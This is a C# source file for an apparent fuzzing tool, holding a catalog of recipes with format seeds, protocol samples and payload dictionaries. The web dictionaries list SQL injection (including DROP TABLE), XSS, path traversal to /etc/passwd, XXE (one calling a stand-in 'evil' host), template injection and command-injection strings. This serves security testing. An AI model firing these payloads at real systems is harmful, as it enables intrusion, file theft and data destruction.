using System.Text;
using Randall.Contracts;

namespace Randall.Infrastructure;

/// <summary>
/// A browsable catalog of fuzzing recipes covering the target classes that dominate exploit-db and
/// commercial fuzzers (beSTORM/Defensics): binary file formats (image/audio/video/archive/document/
/// font), text/config formats, network protocols, and web-application payload classes. Each entry is
/// data-driven (magic-byte/starter seed + category tags + suggested mutators + dictionary), so a user
/// can browse by category and instantiate a ready-to-fuzz project in one click. The dataset is
/// deliberately table-driven so it scales toward thousands of recipes without new code.
/// </summary>
public static class RecipeCatalog
{
    private static readonly string[] FileMut = ["bitflip", "havoc", "expand", "boundary", "insert", "truncate", "arith"];
    private static readonly string[] NetMut = ["bitflip", "havoc", "interesting", "dictionary", "insert", "arith"];
    private static readonly string[] WebMut = ["dictionary", "havoc", "insert", "expand"];

    // Reusable dictionaries keyed by bug class (exploit-db tags).
    private static readonly string[] OverflowDict = ["AAAA", new string('A', 256), new string('A', 1024), new string('A', 5000), "\xff\xff\xff\xff"];
    private static readonly string[] FmtDict = ["%s%s%s%s%s", "%n%n%n%n", "%x%x%x%x%x%x%x%x", "%p%p%p%p", "%99999999s", "%1$n"];
    private static readonly string[] IntDict = ["-1", "0", "0x7fffffff", "0xffffffff", "0x80000000", "4294967296", "2147483648"];
    private static readonly string[] SqliDict = ["'", "' OR '1'='1", "' OR 1=1-- -", "\"; DROP TABLE users;--", "1) UNION SELECT NULL--", "admin'--"];
    private static readonly string[] XssDict = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>"];
    private static readonly string[] TraversalDict = ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd"];
    private static readonly string[] XxeDict = ["<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>", "<!ENTITY % p SYSTEM \"http://evil/x\">"];
    private static readonly string[] SstiDict = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "${T(java.lang.Runtime)}"];
    private static readonly string[] CmdiDict = [";id", "|id", "$(id)", "`id`", "&& id", "; cat /etc/passwd"];

    private sealed record Cat(
        string Id, string Name, string Category, string Kind, string Desc,
        string[] Tags, int? Port, string? Ext, byte[] Seed, string[] Mutators, string[] Dict);

    private static readonly Lazy<IReadOnlyList<Cat>> All = new(Build);

    // —— Public API ——

    public static IReadOnlyList<string> Categories() =>
        All.Value.Select(e => e.Category).Distinct().OrderBy(c => c).ToList();

    public static IReadOnlyList<RecipeCatalogEntryDto> List(string? category = null, string? search = null)
    {
        IEnumerable<Cat> q = All.Value;
        if (!string.IsNullOrWhiteSpace(category) && !category.Equals("all", StringComparison.OrdinalIgnoreCase))
            q = q.Where(e => e.Category.Equals(category, StringComparison.OrdinalIgnoreCase));
        if (!string.IsNullOrWhiteSpace(search))
        {
            var s = search.Trim();
            q = q.Where(e =>
                e.Name.Contains(s, StringComparison.OrdinalIgnoreCase) ||
                e.Id.Contains(s, StringComparison.OrdinalIgnoreCase) ||
                e.Desc.Contains(s, StringComparison.OrdinalIgnoreCase) ||
                e.Tags.Any(t => t.Contains(s, StringComparison.OrdinalIgnoreCase)));
        }
        return q.OrderBy(e => e.Category).ThenBy(e => e.Name).Select(ToEntry).ToList();
    }

    public static int Count => All.Value.Count;

    public static RecipeCatalogDetailDto? Get(string id)
    {
        var e = All.Value.FirstOrDefault(x => x.Id.Equals(id, StringComparison.OrdinalIgnoreCase));
        if (e is null) return null;
        var preview = Convert.ToHexString(e.Seed.AsSpan(0, Math.Min(e.Seed.Length, 64)));
        return new RecipeCatalogDetailDto(ToEntry(e), preview, e.Seed.Length, e.Dict);
    }

    /// <summary>Create a working project from a catalog recipe (project YAML + starter seed + mutators + dict).</summary>
    public static CaseSaveResultDto Instantiate(string id, string? name, bool localFolder, string? repoRoot = null)
    {
        var e = All.Value.FirstOrDefault(x => x.Id.Equals(id, StringComparison.OrdinalIgnoreCase));
        if (e is null) return new CaseSaveResultDto(false, $"Recipe '{id}' not found", null, 0);

        var projName = string.IsNullOrWhiteSpace(name) ? e.Id : name!;
        var projKind = e.Kind is "http" ? "tcp" : e.Kind;   // http maps to a tcp target profile
        var port = e.Port ?? (e.Kind is "http" ? 80 : 9999);

        var created = CaseRecipeStore.CreateProject(new CaseNewProjectRequest(
            Name: projName,
            Kind: projKind,
            Description: $"{e.Name} — {e.Desc}",
            Host: projKind is "tcp" or "udp" ? "127.0.0.1" : null,
            Port: projKind is "tcp" or "udp" ? port : null,
            Executable: null,
            LocalFolder: localFolder,
            Extension: e.Ext,
            FileFormat: e.Kind == "file" ? "file-blank" : null), repoRoot);
        if (!created.Ok) return created;

        // Starter seed (magic bytes / sample request) written byte-for-byte.
        CaseRecipeStore.SaveRawSeed(new CaseSaveRawSeedRequest(
            Project: projName,
            FileName: $"{e.Id}_seed{(e.Ext ?? ".bin")}",
            Base64: Convert.ToBase64String(e.Seed),
            AlsoImportRecipe: false), repoRoot);

        try { CaseRecipeStore.SetMutators(new CaseMutatorsRequest(projName, e.Mutators), repoRoot); } catch { /* best-effort */ }
        if (e.Dict.Length > 0)
            try { CaseRecipeStore.SaveDict(new CaseSaveDictRequest(projName, e.Dict, true), repoRoot); } catch { /* best-effort */ }

        return new CaseSaveResultDto(true,
            $"Created project '{projName}' from recipe '{e.Id}' ({e.Category}) — seed + {e.Mutators.Length} mutators + {e.Dict.Length} dict tokens",
            created.Path, e.Seed.Length);
    }

    private static RecipeCatalogEntryDto ToEntry(Cat e) =>
        new(e.Id, e.Name, e.Category, e.Kind, e.Desc, e.Tags, e.Port, e.Ext, e.Mutators, e.Dict.Length);

    // —— Dataset ——

    private static IReadOnlyList<Cat> Build()
    {
        var list = new List<Cat>();

        // Binary file formats: (id, name, category, ext, magicHex, tags, extraDict)
        void FileBin(string id, string name, string cat, string ext, string magicHex, string[] tags)
            => list.Add(new Cat($"file-{id}", $"{name} file parser", cat, "file", $"Fuzz a {name} parser (magic-seeded).",
                tags, null, ext, Pad(Hex(magicHex), 64), FileMut, OverflowDict));

        void FileText(string id, string name, string cat, string ext, string sample, string[] tags, string[]? dict = null)
            => list.Add(new Cat($"file-{id}", $"{name} parser", cat, "file", $"Fuzz a {name} parser (text-seeded).",
                tags, null, ext, Encoding.ASCII.GetBytes(sample), FileMut, dict ?? OverflowDict));

        // Images
        FileBin("jpeg", "JPEG", "Image", ".jpg", "FFD8FFE000104A464946", ["buffer-overflow", "heap-overflow", "media"]);
        FileBin("png", "PNG", "Image", ".png", "89504E470D0A1A0A0000000D49484452", ["buffer-overflow", "integer-overflow", "media"]);
        FileBin("gif", "GIF", "Image", ".gif", "4749463839610100010080", ["buffer-overflow", "media"]);
        FileBin("bmp", "BMP", "Image", ".bmp", "424D46000000000000003600", ["integer-overflow", "media"]);
        FileBin("tiff", "TIFF", "Image", ".tiff", "49492A000800000001000E01", ["heap-overflow", "media"]);
        FileBin("ico", "ICO", "Image", ".ico", "00000100010010101000", ["buffer-overflow", "media"]);
        FileBin("webp", "WebP", "Image", ".webp", "524946460000000057454250", ["media", "integer-overflow"]);
        FileBin("psd", "Photoshop PSD", "Image", ".psd", "38425053000100000000", ["media", "heap-overflow"]);
        FileBin("tga", "Truevision TGA", "Image", ".tga", "000002000000000000000000", ["media"]);
        FileText("svg", "SVG", "Image", ".svg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect/></svg>", ["xxe", "media"], XxeDict);

        // Audio
        FileBin("wav", "WAV (PCM)", "Audio", ".wav", "52494646240000005741564566", ["buffer-overflow", "media"]);
        FileBin("mp3", "MP3", "Audio", ".mp3", "494433030000000000", ["buffer-overflow", "media"]);
        FileBin("ogg", "OGG", "Audio", ".ogg", "4F67675300020000000000000000", ["media"]);
        FileBin("flac", "FLAC", "Audio", ".flac", "664C614300000022", ["media"]);
        FileBin("midi", "MIDI", "Audio", ".mid", "4D546864000000060001", ["buffer-overflow", "media"]);
        FileBin("aiff", "AIFF", "Audio", ".aiff", "464F524D0000000041494646", ["media"]);

        // Video
        FileBin("mp4", "MP4", "Video", ".mp4", "0000001C66747970697336", ["heap-overflow", "media"]);
        FileBin("avi", "AVI", "Video", ".avi", "5249464600000000415649204C495354", ["buffer-overflow", "media"]);
        FileBin("mkv", "Matroska MKV", "Video", ".mkv", "1A45DFA3010000000000", ["media"]);
        FileBin("flv", "Flash Video FLV", "Video", ".flv", "464C5601050000000900", ["media", "buffer-overflow"]);
        FileBin("mov", "QuickTime MOV", "Video", ".mov", "0000001466747970710000", ["media"]);
        FileBin("mpegts", "MPEG-TS", "Video", ".ts", "47400010000000", ["media"]);

        // Archives
        FileBin("zip", "ZIP", "Archive", ".zip", "504B03040A0000000000", ["directory-traversal", "buffer-overflow"]);
        FileBin("gzip", "GZIP", "Archive", ".gz", "1F8B0800000000000003", ["buffer-overflow"]);
        FileBin("tar", "TAR", "Archive", ".tar", "000000000000000000000000757374617200", ["directory-traversal"]);
        FileBin("rar", "RAR", "Archive", ".rar", "526172211A0700CF9073", ["heap-overflow"]);
        FileBin("7z", "7-Zip", "Archive", ".7z", "377ABCAF271C000400", ["heap-overflow"]);
        FileBin("bzip2", "BZIP2", "Archive", ".bz2", "425A683931415926535900", ["buffer-overflow"]);
        FileBin("xz", "XZ", "Archive", ".xz", "FD377A585A000000FF12", ["buffer-overflow"]);
        FileBin("cab", "Microsoft CAB", "Archive", ".cab", "4D53434600000000", ["heap-overflow"]);

        // Documents
        FileText("pdf", "PDF", "Document", ".pdf", "%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>", ["buffer-overflow", "heap-overflow", "xxe"]);
        FileBin("ole", "MS Office (OLE DOC/XLS/PPT)", "Document", ".doc", "D0CF11E0A1B11AE1000000", ["buffer-overflow", "object-injection"]);
        FileBin("ooxml", "OOXML (DOCX/XLSX/PPTX)", "Document", ".docx", "504B03040A00000000", ["xxe", "object-injection"]);
        FileText("rtf", "RTF", "Document", ".rtf", "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}AAAA}", ["buffer-overflow"]);
        FileText("ps", "PostScript", "Document", ".ps", "%!PS-Adobe-3.0\n%%EOF", ["command-injection", "buffer-overflow"], CmdiDict);
        FileBin("dicom", "DICOM (medical)", "Document", ".dcm", "0000000000000000000000000000000000000000", ["heap-overflow"]);

        // Fonts
        FileBin("ttf", "TrueType TTF", "Font", ".ttf", "0001000000090080000300", ["heap-overflow", "buffer-overflow"]);
        FileBin("otf", "OpenType OTF", "Font", ".otf", "4F54544F00090080000300", ["heap-overflow"]);
        FileBin("woff", "WOFF", "Font", ".woff", "774F464600010000000000", ["buffer-overflow"]);
        FileBin("woff2", "WOFF2", "Font", ".woff2", "774F4632000100000000", ["buffer-overflow"]);

        // Playlists / subtitles (classic media-player overflows)
        FileText("m3u", "M3U playlist", "Playlist", ".m3u", "#EXTM3U\n#EXTINF:1,x\n" + new string('A', 32), ["buffer-overflow"]);
        FileText("m3u8", "M3U8 (HLS)", "Playlist", ".m3u8", "#EXTM3U\n#EXT-X-VERSION:3\n", ["buffer-overflow"]);
        FileText("pls", "PLS playlist", "Playlist", ".pls", "[playlist]\nFile1=" + new string('A', 32) + "\n", ["buffer-overflow"]);
        FileText("srt", "SRT subtitles", "Playlist", ".srt", "1\n00:00:01,000 --> 00:00:02,000\nAAAA\n", ["buffer-overflow"]);
        FileText("cue", "CUE sheet", "Playlist", ".cue", "FILE \"x.wav\" WAVE\n  TRACK 01 AUDIO\n", ["buffer-overflow"]);

        // Data / config
        FileText("xml", "XML", "Data/Config", ".xml", "<?xml version=\"1.0\"?><root><item>x</item></root>", ["xxe", "buffer-overflow"], XxeDict);
        FileText("json", "JSON", "Data/Config", ".json", "{\"key\":\"value\",\"n\":0}", ["deserialization", "integer-overflow"], IntDict);
        FileText("yaml", "YAML", "Data/Config", ".yaml", "---\nkey: value\nlist:\n  - 1\n", ["deserialization", "object-injection"]);
        FileText("csv", "CSV", "Data/Config", ".csv", "a,b,c\n1,2,3\n", ["command-injection", "csv-injection"], ["=cmd|'/c calc'!A1", "@SUM(1+1)", "+1+1", "-1+1"]);
        FileText("ini", "INI config", "Data/Config", ".ini", "[section]\nkey=" + new string('A', 32) + "\n", ["buffer-overflow"]);
        FileBin("sqlite", "SQLite DB", "Data/Config", ".sqlite", "53514C69746520666F726D6174203300", ["heap-overflow", "use-after-free"]);
        FileBin("pcap", "PCAP capture", "Data/Config", ".pcap", "D4C3B2A102000400000000000000000000000400", ["buffer-overflow"]);
        FileText("html", "HTML", "Data/Config", ".html", "<html><body><h1>x</h1></body></html>", ["xss", "buffer-overflow"], XssDict);

        // Executable / system
        FileBin("elf", "ELF binary", "Executable/System", ".elf", "7F454C46020101000000000000000000", ["buffer-overflow", "out-of-bounds"]);
        FileBin("pe", "PE (EXE/DLL)", "Executable/System", ".exe", "4D5A90000300000004000000", ["buffer-overflow"]);
        FileBin("macho", "Mach-O", "Executable/System", ".macho", "CFFAEDFE0700000103000000", ["buffer-overflow"]);
        FileBin("lnk", "Windows LNK", "Executable/System", ".lnk", "4C0000000114020000000000C0", ["buffer-overflow"]);
        FileBin("ani", "Windows ANI cursor", "Executable/System", ".ani", "524946460000000041434F4E616E6968", ["buffer-overflow"]);

        // —— Network protocols: (id, name, category, kind, port, sample, tags, dict) ——
        void Net(string id, string name, string cat, string kind, int port, string sample, string[] tags, string[]? dict = null)
            => list.Add(new Cat($"net-{id}", $"{name}", cat, kind, $"Fuzz a {name} service on port {port}.",
                tags, port, null, Encoding.ASCII.GetBytes(sample), NetMut, dict ?? OverflowDict.Concat(FmtDict).ToArray()));

        Net("ftp", "FTP", "Mail/Transfer", "tcp", 21, "USER anonymous\r\n", ["buffer-overflow", "format-string"]);
        Net("smtp", "SMTP", "Mail/Transfer", "tcp", 25, "HELO example.com\r\n", ["buffer-overflow", "format-string"]);
        Net("pop3", "POP3", "Mail/Transfer", "tcp", 110, "USER test\r\n", ["buffer-overflow"]);
        Net("imap", "IMAP", "Mail/Transfer", "tcp", 143, "a1 LOGIN user pass\r\n", ["buffer-overflow"]);
        Net("nntp", "NNTP", "Mail/Transfer", "tcp", 119, "GROUP alt.test\r\n", ["buffer-overflow"]);
        Net("tftp", "TFTP", "Mail/Transfer", "udp", 69, "\x00\x01filename\x00netascii\x00", ["buffer-overflow"]);

        Net("http", "HTTP", "Web server", "tcp", 80, "GET / HTTP/1.1\r\nHost: x\r\n\r\n", ["buffer-overflow", "traversal"], TraversalDict);
        Net("http2", "HTTP/2", "Web server", "tcp", 8080, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", ["buffer-overflow"]);
        Net("rtsp", "RTSP", "Media/Streaming", "tcp", 554, "OPTIONS rtsp://x RTSP/1.0\r\nCSeq: 1\r\n\r\n", ["buffer-overflow"]);
        Net("sip", "SIP", "Media/Streaming", "udp", 5060, "REGISTER sip:x SIP/2.0\r\nVia: SIP/2.0/UDP x\r\n\r\n", ["buffer-overflow", "format-string"]);
        Net("rtp", "RTP", "Media/Streaming", "udp", 5004, "\x80\x00\x00\x01\x00\x00\x00\x00", ["buffer-overflow"]);

        Net("dns", "DNS", "Naming/Directory", "udp", 53, "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01", ["buffer-overflow", "integer-overflow"]);
        Net("ldap", "LDAP", "Naming/Directory", "tcp", 389, "\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00", ["buffer-overflow"]);
        Net("snmp", "SNMP", "Naming/Directory", "udp", 161, "\x30\x26\x02\x01\x00\x04\x06public", ["buffer-overflow"]);
        Net("dhcp", "DHCP", "Naming/Directory", "udp", 67, "\x01\x01\x06\x00", ["buffer-overflow"]);
        Net("ntp", "NTP", "Naming/Directory", "udp", 123, "\x1b" + new string('\x00', 47), ["buffer-overflow"]);
        Net("kerberos", "Kerberos", "Naming/Directory", "tcp", 88, "\x6a\x00", ["buffer-overflow"]);
        Net("radius", "RADIUS", "Naming/Directory", "udp", 1812, "\x01\x00\x00\x14", ["buffer-overflow"]);
        Net("syslog", "Syslog", "Naming/Directory", "udp", 514, "<34>Oct 11 22:14:15 host app: msg\n", ["format-string", "buffer-overflow"], FmtDict);

        Net("redis", "Redis", "Database", "tcp", 6379, "PING\r\n", ["buffer-overflow", "command-injection"]);
        Net("memcached", "Memcached", "Database", "tcp", 11211, "stats\r\n", ["buffer-overflow"]);
        Net("mysql", "MySQL", "Database", "tcp", 3306, "\x0a", ["buffer-overflow"]);
        Net("postgres", "PostgreSQL", "Database", "tcp", 5432, "\x00\x00\x00\x08\x04\xd2\x16\x2f", ["buffer-overflow"]);
        Net("mongodb", "MongoDB", "Database", "tcp", 27017, "\x3a\x00\x00\x00", ["buffer-overflow"]);

        Net("mqtt", "MQTT", "IoT/ICS", "tcp", 1883, "\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c", ["buffer-overflow"]);
        Net("modbus", "Modbus", "IoT/ICS", "tcp", 502, "\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01", ["buffer-overflow", "out-of-bounds"]);
        Net("dnp3", "DNP3", "IoT/ICS", "tcp", 20000, "\x05\x64\x05\xc9\x01\x00\x00\x04", ["buffer-overflow"]);
        Net("coap", "CoAP", "IoT/ICS", "udp", 5683, "\x40\x01\x00\x01", ["buffer-overflow"]);

        Net("telnet", "Telnet", "Remote access", "tcp", 23, "\xff\xfb\x01", ["buffer-overflow"]);
        Net("irc", "IRC", "Remote access", "tcp", 6667, "NICK test\r\nUSER a b c :d\r\n", ["buffer-overflow", "format-string"]);
        Net("vnc", "VNC (RFB)", "Remote access", "tcp", 5900, "RFB 003.008\n", ["buffer-overflow"]);
        Net("rdp", "RDP", "Remote access", "tcp", 3389, "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00", ["buffer-overflow", "use-after-free"]);
        Net("smb", "SMB", "Remote access", "tcp", 445, "\x00\x00\x00\x2f\xffSMB", ["buffer-overflow", "out-of-bounds"]);
        Net("stun", "STUN", "Remote access", "udp", 3478, "\x00\x01\x00\x00\x21\x12\xa4\x42", ["buffer-overflow"]);
        Net("socks", "SOCKS5", "Remote access", "tcp", 1080, "\x05\x01\x00", ["buffer-overflow"]);
        Net("finger", "Finger", "Remote access", "tcp", 79, "root\r\n", ["buffer-overflow", "format-string"]);
        Net("whois", "WHOIS", "Remote access", "tcp", 43, "example.com\r\n", ["buffer-overflow"]);

        // —— Web application payload classes (exploit-db 'webapps') ——
        void Web(string id, string name, string desc, string[] tags, string[] dict)
            => list.Add(new Cat($"web-{id}", name, "Web application", "http", desc, tags, 80, null,
                Encoding.ASCII.GetBytes("GET /?q=FUZZ HTTP/1.1\r\nHost: target\r\n\r\n"), WebMut, dict));

        Web("sqli", "SQL injection", "Fuzz a web parameter for SQLi.", ["sql-injection"], SqliDict);
        Web("xss", "Cross-site scripting", "Fuzz a reflected/stored XSS sink.", ["xss"], XssDict);
        Web("xxe", "XML external entity", "Fuzz an XML body for XXE.", ["xxe"], XxeDict);
        Web("ssti", "Server-side template injection", "Fuzz a template-rendered parameter.", ["ssti", "rce"], SstiDict);
        Web("traversal", "Path traversal / LFI", "Fuzz a file/path parameter.", ["traversal", "file-inclusion"], TraversalDict);
        Web("cmdi", "Command injection", "Fuzz a shell-backed parameter.", ["command-injection", "rce"], CmdiDict);
        Web("intoverflow", "Integer boundary", "Fuzz numeric parameters for integer bugs.", ["integer-overflow"], IntDict);

        return list;
    }

    private static byte[] Hex(string hex)
    {
        hex = hex.Replace(" ", "");
        var b = new byte[hex.Length / 2];
        for (var i = 0; i < b.Length; i++)
            b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return b;
    }

    private static byte[] Pad(byte[] magic, int total)
    {
        if (magic.Length >= total) return magic;
        var buf = new byte[total];
        Array.Copy(magic, buf, magic.Length);
        for (var i = magic.Length; i < total; i++) buf[i] = 0x41; // 'A' filler
        return buf;
    }
}
